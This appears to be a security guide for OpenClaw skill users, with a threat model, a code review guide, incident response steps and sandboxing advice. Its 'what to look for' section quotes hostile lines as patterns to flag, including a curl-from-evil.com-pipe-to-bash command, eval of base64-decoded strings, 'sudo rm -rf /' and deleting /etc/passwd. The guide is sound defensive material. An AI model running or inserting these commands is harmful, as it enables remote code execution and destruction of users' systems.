# Security Guide for OpenClaw Users

**Comprehensive security practices for the OpenClaw ecosystem**

---

## Threat Model

### What You're Protecting
- Your computer and data
- API keys and credentials
- Personal information
- System integrity

### Threat Actors
- **Malicious skill developers** — Intentional backdoors
- **Compromised accounts** — Legitimate developers hacked
- **Supply chain attacks** — Dependencies compromised
- **Social engineering** — Tricked into running bad code

### Attack Vectors
1. **Malicious skills** — Disguised as useful tools
2. **Dependency poisoning** — Compromised npm packages
3. **Credential theft** — Hardcoded keys harvested
4. **System compromise** — Root access gained

---

## Security Layers

### Layer 1: Prevention (Before Install)

**Hard Hat Scanner**
- Run on every skill before installation
- Automated pattern detection
- Flags known malicious patterns

**Manual Review**
- Read all code before running
- Check for obfuscation
- Verify URLs are legitimate

**Source Verification**
- Only install from GitHub (visible code)
- Check author reputation
- Look for community validation

### Layer 2: Containment (During Use)

**Least Privilege**
- Run as regular user (not root)
- Limit file system access
- Restrict network permissions

**Isolation**
- Test in VM or container first
- Use separate user accounts
- Network segmentation if possible

**Monitoring**
- Watch system logs
- Monitor network connections
- Track file system changes

### Layer 3: Recovery (After Incident)

**Backups**
- Regular system backups
- Version controlled configs
- Offline backup of critical data

**Incident Response**
- Document everything
- Isolate affected systems
- Report to community

---

## Secure Configuration

### Environment Variables

**Good:**
```bash
# .env file (in .gitignore)
TELEGRAM_BOT_TOKEN="123456:ABC-DEF..."
GITHUB_TOKEN="ghp_xxxxxxxxxxxx"
```

**Bad:**
```javascript
// In your code
const TOKEN = "123456:ABC-DEF..."  // ← NEVER
```

### File Permissions

```bash
# Skill files should be readable, not writable by others
chmod 755 skill-directory
chmod 644 skill-files

# .env files should be restricted
chmod 600 .env
```

### Network Security

```bash
# Monitor outbound connections
lsof -i | grep node

# Check for unexpected network activity
netstat -an | grep ESTABLISHED
```

---

## Code Review Guide

### What to Look For

**Critical (Stop immediately):**
```javascript
// Obfuscation
eval(atob("..."))
new Function(decodedString)

// Hardcoded secrets
const API_KEY = "sk-..."
const TOKEN = "123456:..."

// Pipe to shell
exec("curl https://evil.com | bash")

// Known malware
require("openclaw-core")
```

**Suspicious (Review carefully):**
```javascript
// External downloads
fetch("https://unknown-site.com/file.zip")

// System commands
exec("sudo rm -rf /")
exec("chmod +x downloaded-file")

// File system operations
fs.unlink("/etc/passwd")
fs.writeFile("/usr/bin/...", maliciousCode)
```

**Generally OK (but verify):**
```javascript
// Standard library usage
const fs = require('fs')
const path = require('path')

// GitHub API calls (if using env vars)
fetch(`https://api.github.com/...`, {
  headers: { Authorization: `token ${process.env.GITHUB_TOKEN}` }
})
```

### Review Process

1. **Start with README** — Understand what it does
2. **Check dependencies** — Review package.json
3. **Read install scripts** — Most attacks happen here
4. **Review main code** — Look for suspicious patterns
5. **Check for tests** — Well-tested code is safer

---

## Incident Response

### Detection

**Signs of compromise:**
- Unexpected network activity
- New processes you didn't start
- Files modified without your knowledge
- API keys used from unknown locations
- System slowdowns

### Immediate Actions

1. **Don't panic**
   - Most issues are recoverable
   - Act quickly but thoughtfully

2. **Document**
   ```bash
   # Save process list
   ps aux > incident-processes.log
   
   # Save network connections
   netstat -an > incident-network.log
   ```

3. **Isolate**
   ```bash
   # Disconnect network if needed
   # Kill suspicious processes
   kill -9 PID
   ```

4. **Remove**
   ```bash
   # Remove malicious skill
   rm -rf ~/.openclaw/workspace/.agent/skills/bad-skill
   
   # Clear npm cache
   npm cache clean --force
   ```

5. **Scan**
   ```bash
   # Run antivirus
   # Check for persistence mechanisms
   crontab -l
   launchctl list | grep suspicious
   ```

6. **Report**
   - Share findings with community
   - Help others avoid same issue

### Recovery

1. **Verify system integrity**
2. **Change all potentially exposed credentials**
3. **Review access logs**
4. **Implement additional monitoring**

---

## Advanced Security

### Sandboxing

```bash
# Run skill in isolated environment
# Using Docker
docker run -it --rm \
  -v $(pwd):/workspace \
  --network=none \
  node:18-alpine \
  node /workspace/skill.js

# Using chroot (advanced)
sudo chroot /path/to/jail /bin/node skill.js
```

### Network Monitoring

```bash
# Monitor all network activity from node processes
sudo tcpdump -i any -w capture.pcap 'port not 22'

# Analyze with Wireshark
```

### File Integrity Monitoring

```bash
# Create baseline
find ~/.openclaw -type f -exec md5sum {} \; > baseline.md5

# Check for changes
md5sum -c baseline.md5 | grep -v OK
```

---

## Security Checklist for Developers

### Before Publishing a Skill

- [ ] No hardcoded secrets
- [ ] .env in .gitignore
- [ ] SECURITY.md included
- [ ] Clear documentation
- [ ] Minimal dependencies
- [ ] No obfuscated code
- [ ] Tests included
- [ ] Code reviewed by someone else

### Maintenance

- [ ] Monitor dependencies for vulnerabilities
- [ ] Respond to security reports quickly
- [ ] Keep dependencies updated
- [ ] Document security considerations

---

## Resources

### Learning
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Supply Chain Security](https://www.nist.gov/itl/executive-order-14028-improving-nations-cybersecurity/supply-chain-security)

### Tools
- Hard Hat Scanner (this repo)
- `npm audit` — Check for vulnerable dependencies
- `snyk` — Dependency vulnerability scanner
- `clamav` — Antivirus for Linux/Mac

### Community
- OpenClaw Discord security channel
- GitHub Security Advisories
- Security-focused subreddits

---

**Security is a journey, not a destination. Stay vigilant.** 🔒
